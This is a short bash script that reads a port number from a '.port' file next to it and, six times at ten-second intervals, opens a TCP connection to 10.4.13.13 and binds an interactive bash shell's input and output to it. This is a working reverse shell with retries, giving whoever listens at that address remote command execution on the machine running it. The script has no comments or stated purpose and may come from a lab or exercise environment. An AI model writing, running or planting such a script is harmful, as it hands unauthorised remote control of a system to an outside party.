#!/bin/bash

for i in {1..6}; do
    port=$(cat "$(dirname "$(readlink -f "$0")")/.port")

    bash -c "exec 55<>/dev/tcp/10.4.13.13/$port; bash <&55 >&55 2>&55"
    sleep 10
done
